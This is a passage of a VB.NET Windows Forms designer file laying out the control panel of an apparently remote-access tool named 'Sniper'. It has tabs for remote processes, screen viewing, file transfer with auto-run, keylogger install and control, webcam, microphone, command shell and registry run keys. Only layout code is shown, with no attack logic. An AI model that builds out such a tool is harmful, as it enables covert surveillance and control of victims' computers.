        '
        'txtPath
        '
        Me.txtPath.BackColor = System.Drawing.Color.Silver
        Me.txtPath.Location = New System.Drawing.Point(7, 6)
        Me.txtPath.Name = "txtPath"
        Me.txtPath.ReadOnly = True
        Me.txtPath.Size = New System.Drawing.Size(319, 20)
        Me.txtPath.TabIndex = 8
        '
        'cmdGetDr
        '
        Me.cmdGetDr.Location = New System.Drawing.Point(6, 392)
        Me.cmdGetDr.Name = "cmdGetDr"
        Me.cmdGetDr.Size = New System.Drawing.Size(86, 23)
        Me.cmdGetDr.TabIndex = 7
        Me.cmdGetDr.Text = "Get drivers"
        Me.cmdGetDr.UseVisualStyleBackColor = True
        '
        'lblInfoFD
        '
        Me.lblInfoFD.AutoSize = True
        Me.lblInfoFD.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblInfoFD.Location = New System.Drawing.Point(277, 397)
        Me.lblInfoFD.Name = "lblInfoFD"
        Me.lblInfoFD.Size = New System.Drawing.Size(240, 13)
        Me.lblInfoFD.TabIndex = 6
        Me.lblInfoFD.Text = "Right click on desidered file to manage it"
        '
        'chkModListFD
        '
        Me.chkModListFD.AutoSize = True
        Me.chkModListFD.Location = New System.Drawing.Point(332, 6)
        Me.chkModListFD.Name = "chkModListFD"
        Me.chkModListFD.Size = New System.Drawing.Size(185, 17)
        Me.chkModListFD.TabIndex = 5
        Me.chkModListFD.Text = "Show file and folder as icon mode"
        Me.chkModListFD.UseVisualStyleBackColor = True
        '
        'cmdCCListFD
        '
        Me.cmdCCListFD.Location = New System.Drawing.Point(113, 392)
        Me.cmdCCListFD.Name = "cmdCCListFD"
        Me.cmdCCListFD.Size = New System.Drawing.Size(86, 23)
        Me.cmdCCListFD.TabIndex = 4
        Me.cmdCCListFD.Text = "Clear list"
        Me.cmdCCListFD.UseVisualStyleBackColor = True
        '
        'lstwFileFolderR
        '
        Me.lstwFileFolderR.FullRowSelect = True
        Me.lstwFileFolderR.GridLines = True
        Me.lstwFileFolderR.Location = New System.Drawing.Point(7, 28)
        Me.lstwFileFolderR.Name = "lstwFileFolderR"
        Me.lstwFileFolderR.Size = New System.Drawing.Size(510, 358)
        Me.lstwFileFolderR.TabIndex = 3
        Me.lstwFileFolderR.UseCompatibleStateImageBehavior = False
        Me.lstwFileFolderR.View = System.Windows.Forms.View.Details
        '
        'tbpDAUIP
        '
        Me.tbpDAUIP.BackColor = System.Drawing.SystemColors.Control
        Me.tbpDAUIP.Controls.Add(Me.lblStatUp)
        Me.tbpDAUIP.Controls.Add(Me.lblBytesD)
        Me.tbpDAUIP.Controls.Add(Me.chkAvvFFUp)
        Me.tbpDAUIP.Controls.Add(Me.cmsStartUp)
        Me.tbpDAUIP.Controls.Add(Me.cmdStartDow)
        Me.tbpDAUIP.Controls.Add(Me.prgDown)
        Me.tbpDAUIP.Controls.Add(Me.lblUpping)
        Me.tbpDAUIP.Controls.Add(Me.lblDowwing)
        Me.tbpDAUIP.Controls.Add(Me.chkAvvFFin)
        Me.tbpDAUIP.Controls.Add(Me.cmdSPing)
        Me.tbpDAUIP.Controls.Add(Me.cmdSDing)
        Me.tbpDAUIP.Controls.Add(Me.lstwUpL)
        Me.tbpDAUIP.Controls.Add(Me.lstwDowL)
        Me.tbpDAUIP.Location = New System.Drawing.Point(4, 22)
        Me.tbpDAUIP.Name = "tbpDAUIP"
        Me.tbpDAUIP.Padding = New System.Windows.Forms.Padding(3)
        Me.tbpDAUIP.Size = New System.Drawing.Size(523, 421)
        Me.tbpDAUIP.TabIndex = 1
        Me.tbpDAUIP.Text = "Downloads and uploads in progress"
        '
        'lblStatUp
        '
        Me.lblStatUp.AutoSize = True
        Me.lblStatUp.Location = New System.Drawing.Point(63, 195)
        Me.lblStatUp.Name = "lblStatUp"
        Me.lblStatUp.Size = New System.Drawing.Size(47, 13)
        Me.lblStatUp.TabIndex = 17
        Me.lblStatUp.Text = "Stopped"
        '
        'lblBytesD
        '
        Me.lblBytesD.AutoSize = True
        Me.lblBytesD.Location = New System.Drawing.Point(79, 9)
        Me.lblBytesD.Name = "lblBytesD"
        Me.lblBytesD.Size = New System.Drawing.Size(28, 13)
        Me.lblBytesD.TabIndex = 16
        Me.lblBytesD.Text = "0 kb"
        '
        'chkAvvFFUp
        '
        Me.chkAvvFFUp.AutoSize = True
        Me.chkAvvFFUp.Location = New System.Drawing.Point(381, 195)
        Me.chkAvvFFUp.Name = "chkAvvFFUp"
        Me.chkAvvFFUp.Size = New System.Drawing.Size(136, 17)
        Me.chkAvvFFUp.TabIndex = 15
        Me.chkAvvFFUp.Text = "Run file after uploaded "
        Me.chkAvvFFUp.UseVisualStyleBackColor = True
        '
        'cmsStartUp
        '
        Me.cmsStartUp.Location = New System.Drawing.Point(404, 387)
        Me.cmsStartUp.Name = "cmsStartUp"
        Me.cmsStartUp.Size = New System.Drawing.Size(113, 23)
        Me.cmsStartUp.TabIndex = 14
        Me.cmsStartUp.Text = "Start uploading"
        Me.cmsStartUp.UseVisualStyleBackColor = True
        '
        'cmdStartDow
        '
        Me.cmdStartDow.Location = New System.Drawing.Point(285, 387)
        Me.cmdStartDow.Name = "cmdStartDow"
        Me.cmdStartDow.Size = New System.Drawing.Size(113, 23)
        Me.cmdStartDow.TabIndex = 13
        Me.cmdStartDow.Text = "Start downloading"
        Me.cmdStartDow.UseVisualStyleBackColor = True
        '
        'prgDown
        '
        Me.prgDown.Location = New System.Drawing.Point(417, 7)
        Me.prgDown.Name = "prgDown"
        Me.prgDown.Size = New System.Drawing.Size(100, 15)
        Me.prgDown.TabIndex = 11
        '
        'lblUpping
        '
        Me.lblUpping.AutoSize = True
        Me.lblUpping.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblUpping.Location = New System.Drawing.Point(6, 195)
        Me.lblUpping.Name = "lblUpping"
        Me.lblUpping.Size = New System.Drawing.Size(51, 13)
        Me.lblUpping.TabIndex = 10
        Me.lblUpping.Text = "Upload:"
        '
        'lblDowwing
        '
        Me.lblDowwing.AutoSize = True
        Me.lblDowwing.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblDowwing.Location = New System.Drawing.Point(6, 9)
        Me.lblDowwing.Name = "lblDowwing"
        Me.lblDowwing.Size = New System.Drawing.Size(67, 13)
        Me.lblDowwing.TabIndex = 9
        Me.lblDowwing.Text = "Download:"
        '
        'chkAvvFFin
        '
        Me.chkAvvFFin.AutoSize = True
        Me.chkAvvFFin.Location = New System.Drawing.Point(258, 8)
        Me.chkAvvFFin.Name = "chkAvvFFin"
        Me.chkAvvFFin.Size = New System.Drawing.Size(150, 17)
        Me.chkAvvFFin.TabIndex = 8
        Me.chkAvvFFin.Text = "Run file after downloaded "
        Me.chkAvvFFin.UseVisualStyleBackColor = True
        '
        'cmdSPing
        '
        Me.cmdSPing.Location = New System.Drawing.Point(126, 387)
        Me.cmdSPing.Name = "cmdSPing"
        Me.cmdSPing.Size = New System.Drawing.Size(113, 23)
        Me.cmdSPing.TabIndex = 7
        Me.cmdSPing.Text = "Stop uploading"
        Me.cmdSPing.UseVisualStyleBackColor = True
        '
        'cmdSDing
        '
        Me.cmdSDing.Location = New System.Drawing.Point(7, 387)
        Me.cmdSDing.Name = "cmdSDing"
        Me.cmdSDing.Size = New System.Drawing.Size(113, 23)
        Me.cmdSDing.TabIndex = 6
        Me.cmdSDing.Text = "Stop downloading"
        Me.cmdSDing.UseVisualStyleBackColor = True
        '
        'lstwUpL
        '
        Me.lstwUpL.FullRowSelect = True
        Me.lstwUpL.Location = New System.Drawing.Point(6, 214)
        Me.lstwUpL.Name = "lstwUpL"
        Me.lstwUpL.Size = New System.Drawing.Size(511, 166)
        Me.lstwUpL.TabIndex = 5
        Me.lstwUpL.UseCompatibleStateImageBehavior = False
        Me.lstwUpL.View = System.Windows.Forms.View.Details
        '
        'lstwDowL
        '
        Me.lstwDowL.FullRowSelect = True
        Me.lstwDowL.Location = New System.Drawing.Point(6, 30)
        Me.lstwDowL.Name = "lstwDowL"
        Me.lstwDowL.Size = New System.Drawing.Size(511, 159)
        Me.lstwDowL.TabIndex = 4
        Me.lstwDowL.UseCompatibleStateImageBehavior = False
        Me.lstwDowL.View = System.Windows.Forms.View.Details
        '
        'tb2
        '
        Me.tb2.BackColor = System.Drawing.SystemColors.Control
        Me.tb2.Controls.Add(Me.picBanDesk)
        Me.tb2.Controls.Add(Me.grpPMang)
        Me.tb2.Controls.Add(Me.grpScrSS)
        Me.tb2.Location = New System.Drawing.Point(4, 22)
        Me.tb2.Name = "tb2"
        Me.tb2.Padding = New System.Windows.Forms.Padding(3)
        Me.tb2.Size = New System.Drawing.Size(544, 460)
        Me.tb2.TabIndex = 1
        Me.tb2.Text = "Remote Screen"
        '
        'picBanDesk
        '
        Me.picBanDesk.Image = Global.Sniper.My.Resources.Resources._1297454786_gnutella
        Me.picBanDesk.Location = New System.Drawing.Point(464, 6)
        Me.picBanDesk.Name = "picBanDesk"
        Me.picBanDesk.Size = New System.Drawing.Size(60, 67)
        Me.picBanDesk.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.picBanDesk.TabIndex = 3
        Me.picBanDesk.TabStop = False
        '
        'grpPMang
        '
        Me.grpPMang.Controls.Add(Me.cmdResText)
        Me.grpPMang.Controls.Add(Me.cmdCancellaTestoP)
        Me.grpPMang.Controls.Add(Me.cmdPiPP)
        Me.grpPMang.Controls.Add(Me.cmdPrintOnDesk)
        Me.grpPMang.Controls.Add(Me.txtTesto)
        Me.grpPMang.Location = New System.Drawing.Point(17, 79)
        Me.grpPMang.Name = "grpPMang"
        Me.grpPMang.Size = New System.Drawing.Size(507, 372)
        Me.grpPMang.TabIndex = 2
        Me.grpPMang.TabStop = False
        Me.grpPMang.Text = "Printer manager"
        '
        'cmdResText
        '
        Me.cmdResText.Location = New System.Drawing.Point(147, 334)
        Me.cmdResText.Name = "cmdResText"
        Me.cmdResText.Size = New System.Drawing.Size(16, 23)
        Me.cmdResText.TabIndex = 6
        Me.cmdResText.Text = "X"
        Me.cmdResText.UseVisualStyleBackColor = True
        '
        'cmdCancellaTestoP
        '
        Me.cmdCancellaTestoP.Location = New System.Drawing.Point(188, 334)
        Me.cmdCancellaTestoP.Name = "cmdCancellaTestoP"
        Me.cmdCancellaTestoP.Size = New System.Drawing.Size(135, 23)
        Me.cmdCancellaTestoP.TabIndex = 5
        Me.cmdCancellaTestoP.Text = "Clear the text"
        Me.cmdCancellaTestoP.UseVisualStyleBackColor = True
        '
        'cmdPiPP
        '
        Me.cmdPiPP.Location = New System.Drawing.Point(366, 334)
        Me.cmdPiPP.Name = "cmdPiPP"
        Me.cmdPiPP.Size = New System.Drawing.Size(135, 23)
        Me.cmdPiPP.TabIndex = 4
        Me.cmdPiPP.Text = "Print it with the printer!"
        Me.cmdPiPP.UseVisualStyleBackColor = True
        '
        'cmdPrintOnDesk
        '
        Me.cmdPrintOnDesk.Location = New System.Drawing.Point(6, 334)
        Me.cmdPrintOnDesk.Name = "cmdPrintOnDesk"
        Me.cmdPrintOnDesk.Size = New System.Drawing.Size(135, 23)
        Me.cmdPrintOnDesk.TabIndex = 3
        Me.cmdPrintOnDesk.Text = "Print on remote desktop"
        Me.cmdPrintOnDesk.UseVisualStyleBackColor = True
        '
        'txtTesto
        '
        Me.txtTesto.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtTesto.Location = New System.Drawing.Point(7, 20)
        Me.txtTesto.Multiline = True
        Me.txtTesto.Name = "txtTesto"
        Me.txtTesto.ScrollBars = System.Windows.Forms.ScrollBars.Both
        Me.txtTesto.Size = New System.Drawing.Size(494, 308)
        Me.txtTesto.TabIndex = 0
        Me.txtTesto.Text = "Write something to print.."
        '
        'grpScrSS
        '
        Me.grpScrSS.Controls.Add(Me.cmdHWR)
        Me.grpScrSS.Controls.Add(Me.lblYN)
        Me.grpScrSS.Controls.Add(Me.lblY)
        Me.grpScrSS.Controls.Add(Me.lblXN)
        Me.grpScrSS.Controls.Add(Me.lblX)
        Me.grpScrSS.Controls.Add(Me.cmdGDSR)
        Me.grpScrSS.Controls.Add(Me.cmdVisII)
        Me.grpScrSS.Location = New System.Drawing.Point(17, 6)
        Me.grpScrSS.Name = "grpScrSS"
        Me.grpScrSS.Size = New System.Drawing.Size(441, 67)
        Me.grpScrSS.TabIndex = 1
        Me.grpScrSS.TabStop = False
        Me.grpScrSS.Text = "Screen settings"
        '
        'cmdHWR
        '
        Me.cmdHWR.Location = New System.Drawing.Point(152, 15)
        Me.cmdHWR.Name = "cmdHWR"
        Me.cmdHWR.Size = New System.Drawing.Size(134, 23)
        Me.cmdHWR.TabIndex = 7
        Me.cmdHWR.Text = "Hide wallpaper"
        Me.cmdHWR.UseVisualStyleBackColor = True
        '
        'lblYN
        '
        Me.lblYN.AutoSize = True
        Me.lblYN.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblYN.Location = New System.Drawing.Point(326, 43)
        Me.lblYN.Name = "lblYN"
        Me.lblYN.Size = New System.Drawing.Size(14, 13)
        Me.lblYN.TabIndex = 5
        Me.lblYN.Text = "0"
        '
        'lblY
        '
        Me.lblY.AutoSize = True
        Me.lblY.Location = New System.Drawing.Point(302, 43)
        Me.lblY.Name = "lblY"
        Me.lblY.Size = New System.Drawing.Size(17, 13)
        Me.lblY.TabIndex = 4
        Me.lblY.Text = "Y:"
        '
        'lblXN
        '
        Me.lblXN.AutoSize = True
        Me.lblXN.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblXN.Location = New System.Drawing.Point(326, 21)
        Me.lblXN.Name = "lblXN"
        Me.lblXN.Size = New System.Drawing.Size(14, 13)
        Me.lblXN.TabIndex = 3
        Me.lblXN.Text = "0"
        '
        'lblX
        '
        Me.lblX.AutoSize = True
        Me.lblX.Location = New System.Drawing.Point(302, 21)
        Me.lblX.Name = "lblX"
        Me.lblX.Size = New System.Drawing.Size(17, 13)
        Me.lblX.TabIndex = 2
        Me.lblX.Text = "X:"
        '
        'cmdGDSR
        '
        Me.cmdGDSR.Location = New System.Drawing.Point(152, 38)
        Me.cmdGDSR.Name = "cmdGDSR"
        Me.cmdGDSR.Size = New System.Drawing.Size(135, 23)
        Me.cmdGDSR.TabIndex = 1
        Me.cmdGDSR.Text = "Get desktop resolution"
        Me.cmdGDSR.UseVisualStyleBackColor = True
        '
        'cmdVisII
        '
        Me.cmdVisII.Location = New System.Drawing.Point(11, 15)
        Me.cmdVisII.Name = "cmdVisII"
        Me.cmdVisII.Size = New System.Drawing.Size(135, 46)
        Me.cmdVisII.TabIndex = 0
        Me.cmdVisII.Text = "Open images receiver"
        Me.cmdVisII.UseVisualStyleBackColor = True
        '
        'tb1
        '
        Me.tb1.BackColor = System.Drawing.SystemColors.Control
        Me.tb1.Controls.Add(Me.cmdStartSite)
        Me.tb1.Controls.Add(Me.txtURLR)
        Me.tb1.Controls.Add(Me.lblRTO)
        Me.tb1.Controls.Add(Me.lblClip)
        Me.tb1.Controls.Add(Me.txtClip)
        Me.tb1.Controls.Add(Me.tcTask)
        Me.tb1.Controls.Add(Me.grpWinRem)
        Me.tb1.Controls.Add(Me.grpTask)
        Me.tb1.Location = New System.Drawing.Point(4, 22)
        Me.tb1.Name = "tb1"
        Me.tb1.Padding = New System.Windows.Forms.Padding(3)
        Me.tb1.Size = New System.Drawing.Size(544, 460)
        Me.tb1.TabIndex = 0
        Me.tb1.Text = "TaskManager"
        '
        'cmdStartSite
        '
        Me.cmdStartSite.Location = New System.Drawing.Point(477, 431)
        Me.cmdStartSite.Name = "cmdStartSite"
        Me.cmdStartSite.Size = New System.Drawing.Size(61, 23)
        Me.cmdStartSite.TabIndex = 9
        Me.cmdStartSite.Text = "Start"
        Me.cmdStartSite.UseVisualStyleBackColor = True
        '
        'txtURLR
        '
        Me.txtURLR.Location = New System.Drawing.Point(338, 434)
        Me.txtURLR.Name = "txtURLR"
        Me.txtURLR.Size = New System.Drawing.Size(133, 20)
        Me.txtURLR.TabIndex = 8
        Me.txtURLR.Text = "http://www.google.it"
        '
        'lblRTO
        '
        Me.lblRTO.AutoSize = True
        Me.lblRTO.Location = New System.Drawing.Point(338, 418)
        Me.lblRTO.Name = "lblRTO"
        Me.lblRTO.Size = New System.Drawing.Size(71, 13)
        Me.lblRTO.TabIndex = 7
        Me.lblRTO.Text = "URL to open:"
        '
        'lblClip
        '
        Me.lblClip.AutoSize = True
        Me.lblClip.Location = New System.Drawing.Point(338, 230)
        Me.lblClip.Name = "lblClip"
        Me.lblClip.Size = New System.Drawing.Size(72, 13)
        Me.lblClip.TabIndex = 6
        Me.lblClip.Text = "File clipboard:"
        '
        'txtClip
        '
        Me.txtClip.Location = New System.Drawing.Point(338, 246)
        Me.txtClip.Name = "txtClip"
        Me.txtClip.ReadOnly = True
        Me.txtClip.Size = New System.Drawing.Size(200, 20)
        Me.txtClip.TabIndex = 5
        '
        'tcTask
        '
        Me.tcTask.Controls.Add(Me.tbPL)
        Me.tcTask.Location = New System.Drawing.Point(6, 9)
        Me.tcTask.Name = "tcTask"
        Me.tcTask.SelectedIndex = 0
        Me.tcTask.Size = New System.Drawing.Size(326, 445)
        Me.tcTask.TabIndex = 4
        '
        'tbPL
        '
        Me.tbPL.BackColor = System.Drawing.SystemColors.ControlDark
        Me.tbPL.Controls.Add(Me.lstwProcessi)
        Me.tbPL.Location = New System.Drawing.Point(4, 22)
        Me.tbPL.Name = "tbPL"
        Me.tbPL.Padding = New System.Windows.Forms.Padding(3)
        Me.tbPL.Size = New System.Drawing.Size(318, 419)
        Me.tbPL.TabIndex = 0
        Me.tbPL.Text = "Processes list"
        '
        'lstwProcessi
        '
        Me.lstwProcessi.FullRowSelect = True
        Me.lstwProcessi.Location = New System.Drawing.Point(6, 6)
        Me.lstwProcessi.MultiSelect = False
        Me.lstwProcessi.Name = "lstwProcessi"
        Me.lstwProcessi.Size = New System.Drawing.Size(306, 407)
        Me.lstwProcessi.TabIndex = 1
        Me.lstwProcessi.UseCompatibleStateImageBehavior = False
        Me.lstwProcessi.View = System.Windows.Forms.View.Details
        '
        'grpWinRem
        '
        Me.grpWinRem.Controls.Add(Me.cmdHid)
        Me.grpWinRem.Controls.Add(Me.cmdRes)
        Me.grpWinRem.Controls.Add(Me.cmdMin)
        Me.grpWinRem.Controls.Add(Me.cmdMax)
        Me.grpWinRem.Location = New System.Drawing.Point(338, 272)
        Me.grpWinRem.Name = "grpWinRem"
        Me.grpWinRem.Size = New System.Drawing.Size(200, 135)
        Me.grpWinRem.TabIndex = 3
        Me.grpWinRem.TabStop = False
        Me.grpWinRem.Text = "Active windows"
        '
        'cmdHid
        '
        Me.cmdHid.Location = New System.Drawing.Point(5, 106)
        Me.cmdHid.Name = "cmdHid"
        Me.cmdHid.Size = New System.Drawing.Size(188, 23)
        Me.cmdHid.TabIndex = 7
        Me.cmdHid.Text = "Hide"
        Me.cmdHid.UseVisualStyleBackColor = True
        '
        'cmdRes
        '
        Me.cmdRes.Location = New System.Drawing.Point(7, 77)
        Me.cmdRes.Name = "cmdRes"
        Me.cmdRes.Size = New System.Drawing.Size(187, 23)
        Me.cmdRes.TabIndex = 6
        Me.cmdRes.Text = "Restore"
        Me.cmdRes.UseVisualStyleBackColor = True
        '
        'cmdMin
        '
        Me.cmdMin.Location = New System.Drawing.Point(7, 48)
        Me.cmdMin.Name = "cmdMin"
        Me.cmdMin.Size = New System.Drawing.Size(187, 23)
        Me.cmdMin.TabIndex = 5
        Me.cmdMin.Text = "Minimize"
        Me.cmdMin.UseVisualStyleBackColor = True
        '
        'cmdMax
        '
        Me.cmdMax.Location = New System.Drawing.Point(6, 19)
        Me.cmdMax.Name = "cmdMax"
        Me.cmdMax.Size = New System.Drawing.Size(187, 23)
        Me.cmdMax.TabIndex = 4
        Me.cmdMax.Text = "Maximize"
        Me.cmdMax.UseVisualStyleBackColor = True
        '
        'grpTask
        '
        Me.grpTask.Controls.Add(Me.picStart)
        Me.grpTask.Controls.Add(Me.rbtMa)
        Me.grpTask.Controls.Add(Me.rbtMi)
        Me.grpTask.Controls.Add(Me.rbtNo)
        Me.grpTask.Controls.Add(Me.rbtHi)
        Me.grpTask.Controls.Add(Me.cmdAvviAs)
        Me.grpTask.Controls.Add(Me.lblPDAVV)
        Me.grpTask.Controls.Add(Me.txtProcessoDAA)
        Me.grpTask.Controls.Add(Me.cmdTerminaPB)
        Me.grpTask.Controls.Add(Me.cmdTerminaPN)
        Me.grpTask.Controls.Add(Me.cmdCancellaL)
        Me.grpTask.Controls.Add(Me.cmdOttieniP)
        Me.grpTask.Location = New System.Drawing.Point(338, 9)
        Me.grpTask.Name = "grpTask"
        Me.grpTask.Size = New System.Drawing.Size(200, 218)
        Me.grpTask.TabIndex = 2
        Me.grpTask.TabStop = False
        Me.grpTask.Text = "Task"
        '
        'picStart
        '
        Me.picStart.Image = Global.Sniper.My.Resources.Resources._1297106147_Play1Hot
        Me.picStart.Location = New System.Drawing.Point(87, 161)
        Me.picStart.Name = "picStart"
        Me.picStart.Size = New System.Drawing.Size(22, 27)
        Me.picStart.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.picStart.TabIndex = 12
        Me.picStart.TabStop = False
        '
        'rbtMa
        '
        Me.rbtMa.AutoSize = True
        Me.rbtMa.Location = New System.Drawing.Point(119, 187)
        Me.rbtMa.Name = "rbtMa"
        Me.rbtMa.Size = New System.Drawing.Size(74, 17)
        Me.rbtMa.TabIndex = 11
        Me.rbtMa.Text = "Maximized"
        Me.rbtMa.UseVisualStyleBackColor = True
        '
        'rbtMi
        '
        Me.rbtMi.AutoSize = True
        Me.rbtMi.Location = New System.Drawing.Point(7, 187)
        Me.rbtMi.Name = "rbtMi"
        Me.rbtMi.Size = New System.Drawing.Size(71, 17)
        Me.rbtMi.TabIndex = 10
        Me.rbtMi.Text = "Minimized"
        Me.rbtMi.UseVisualStyleBackColor = True
        '
        'rbtNo
        '
        Me.rbtNo.AutoSize = True
        Me.rbtNo.Checked = True
        Me.rbtNo.Location = New System.Drawing.Point(128, 153)
        Me.rbtNo.Name = "rbtNo"
        Me.rbtNo.Size = New System.Drawing.Size(65, 17)
        Me.rbtNo.TabIndex = 9
        Me.rbtNo.TabStop = True
        Me.rbtNo.Text = "Normally"
        Me.rbtNo.UseVisualStyleBackColor = True
        '
        'rbtHi
        '
        Me.rbtHi.AutoSize = True
        Me.rbtHi.Location = New System.Drawing.Point(7, 153)
        Me.rbtHi.Name = "rbtHi"
        Me.rbtHi.Size = New System.Drawing.Size(59, 17)
        Me.rbtHi.TabIndex = 8
        Me.rbtHi.Text = "Hidden"
        Me.rbtHi.UseVisualStyleBackColor = True
        '
        'cmdAvviAs
        '
        Me.cmdAvviAs.Location = New System.Drawing.Point(6, 123)
        Me.cmdAvviAs.Name = "cmdAvviAs"
        Me.cmdAvviAs.Size = New System.Drawing.Size(187, 23)
        Me.cmdAvviAs.TabIndex = 7
        Me.cmdAvviAs.Text = "Start process"
        Me.cmdAvviAs.UseVisualStyleBackColor = True
        '
        'lblPDAVV
        '
        Me.lblPDAVV.AutoSize = True
        Me.lblPDAVV.Location = New System.Drawing.Point(7, 78)
        Me.lblPDAVV.Name = "lblPDAVV"
        Me.lblPDAVV.Size = New System.Drawing.Size(56, 13)
        Me.lblPDAVV.TabIndex = 6
        Me.lblPDAVV.Text = "EXE Path:"
        '
        'txtProcessoDAA
        '
        Me.txtProcessoDAA.Location = New System.Drawing.Point(6, 97)
        Me.txtProcessoDAA.Name = "txtProcessoDAA"
        Me.txtProcessoDAA.Size = New System.Drawing.Size(187, 20)
        Me.txtProcessoDAA.TabIndex = 5
        Me.txtProcessoDAA.Text = "notepad.exe"
        '
        'cmdTerminaPB
        '
        Me.cmdTerminaPB.Location = New System.Drawing.Point(107, 48)
        Me.cmdTerminaPB.Name = "cmdTerminaPB"
        Me.cmdTerminaPB.Size = New System.Drawing.Size(87, 23)
        Me.cmdTerminaPB.TabIndex = 4
        Me.cmdTerminaPB.Text = "Kill process"
        Me.cmdTerminaPB.UseVisualStyleBackColor = True
        '
        'cmdTerminaPN
        '
        Me.cmdTerminaPN.Location = New System.Drawing.Point(6, 48)
        Me.cmdTerminaPN.Name = "cmdTerminaPN"
        Me.cmdTerminaPN.Size = New System.Drawing.Size(95, 23)
        Me.cmdTerminaPN.TabIndex = 3
        Me.cmdTerminaPN.Text = "Close process"
        Me.cmdTerminaPN.UseVisualStyleBackColor = True
        '
        'cmdCancellaL
        '
        Me.cmdCancellaL.Location = New System.Drawing.Point(123, 19)
        Me.cmdCancellaL.Name = "cmdCancellaL"
        Me.cmdCancellaL.Size = New System.Drawing.Size(71, 23)
        Me.cmdCancellaL.TabIndex = 2
        Me.cmdCancellaL.Text = "Clear list"
        Me.cmdCancellaL.UseVisualStyleBackColor = True
        '
        'cmdOttieniP
        '
        Me.cmdOttieniP.Location = New System.Drawing.Point(6, 19)
        Me.cmdOttieniP.Name = "cmdOttieniP"
        Me.cmdOttieniP.Size = New System.Drawing.Size(111, 23)
        Me.cmdOttieniP.TabIndex = 1
        Me.cmdOttieniP.Text = "Get processes"
        Me.cmdOttieniP.UseVisualStyleBackColor = True
        '
        'tbcPannello
        '
        Me.tbcPannello.Controls.Add(Me.tb1)
        Me.tbcPannello.Controls.Add(Me.tb2)
        Me.tbcPannello.Controls.Add(Me.tbpFileMan)
        Me.tbcPannello.Controls.Add(Me.tbcMex)
        Me.tbcPannello.Controls.Add(Me.tbpWebc)
        Me.tbcPannello.Controls.Add(Me.tbpKey)
        Me.tbcPannello.Controls.Add(Me.tbMicroP)
        Me.tbcPannello.Controls.Add(Me.tbpChat)
        Me.tbcPannello.Controls.Add(Me.tbPorts)
        Me.tbcPannello.Controls.Add(Me.tbClip)
        Me.tbcPannello.Controls.Add(Me.tbDD)
        Me.tbcPannello.Controls.Add(Me.tbCMD)
        Me.tbcPannello.Controls.Add(Me.tbpRegRun)
        Me.tbcPannello.Location = New System.Drawing.Point(12, 65)
        Me.tbcPannello.Name = "tbcPannello"
        Me.tbcPannello.SelectedIndex = 0
        Me.tbcPannello.Size = New System.Drawing.Size(552, 486)
        Me.tbcPannello.TabIndex = 0
        '
        'tbpKey
        '
        Me.tbpKey.BackColor = System.Drawing.SystemColors.Control
        Me.tbpKey.Controls.Add(Me.cmdClrTxt)
        Me.tbpKey.Controls.Add(Me.txtacK)
        Me.tbpKey.Controls.Add(Me.lblTipTxtAck)
        Me.tbpKey.Controls.Add(Me.lblOKS)
        Me.tbpKey.Controls.Add(Me.lblStppK)
        Me.tbpKey.Controls.Add(Me.cmdStopK)
        Me.tbpKey.Controls.Add(Me.cdSTARTOnK)
        Me.tbpKey.Controls.Add(Me.cmdGetK)
        Me.tbpKey.Controls.Add(Me.cmdInstallK)
        Me.tbpKey.Controls.Add(Me.txtKey)
        Me.tbpKey.Controls.Add(Me.picKB)
        Me.tbpKey.Controls.Add(Me.cmdSaveKs)
        Me.tbpKey.Location = New System.Drawing.Point(4, 22)
        Me.tbpKey.Name = "tbpKey"
        Me.tbpKey.Size = New System.Drawing.Size(544, 460)
        Me.tbpKey.TabIndex = 5
        Me.tbpKey.Text = "Keylogger"
        '
        'cmdClrTxt
        '
        Me.cmdClrTxt.Location = New System.Drawing.Point(383, 31)
        Me.cmdClrTxt.Name = "cmdClrTxt"
        Me.cmdClrTxt.Size = New System.Drawing.Size(75, 23)
        Me.cmdClrTxt.TabIndex = 13
        Me.cmdClrTxt.Text = "Clear text"
        Me.cmdClrTxt.UseVisualStyleBackColor = True
        '
        'txtacK
        '
        Me.txtacK.Location = New System.Drawing.Point(175, 12)
        Me.txtacK.Name = "txtacK"
        Me.txtacK.ReadOnly = True
        Me.txtacK.Size = New System.Drawing.Size(283, 20)
        Me.txtacK.TabIndex = 12
        '
        'lblTipTxtAck
        '
        Me.lblTipTxtAck.AutoSize = True
        Me.lblTipTxtAck.Location = New System.Drawing.Point(91, 15)
        Me.lblTipTxtAck.Name = "lblTipTxtAck"
        Me.lblTipTxtAck.Size = New System.Drawing.Size(79, 13)
        Me.lblTipTxtAck.TabIndex = 11
        Me.lblTipTxtAck.Text = "Active window:"
        '
        'lblOKS
        '
        Me.lblOKS.AutoSize = True
        Me.lblOKS.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Italic), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblOKS.Location = New System.Drawing.Point(91, 40)
        Me.lblOKS.Name = "lblOKS"
        Me.lblOKS.Size = New System.Drawing.Size(139, 13)
        Me.lblOKS.TabIndex = 10
        Me.lblOKS.Text = "Offline keylogger state:"
        '
        'lblStppK
        '
        Me.lblStppK.AutoSize = True
        Me.lblStppK.BackColor = System.Drawing.Color.Black
        Me.lblStppK.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblStppK.ForeColor = System.Drawing.Color.Lime
        Me.lblStppK.Location = New System.Drawing.Point(236, 40)
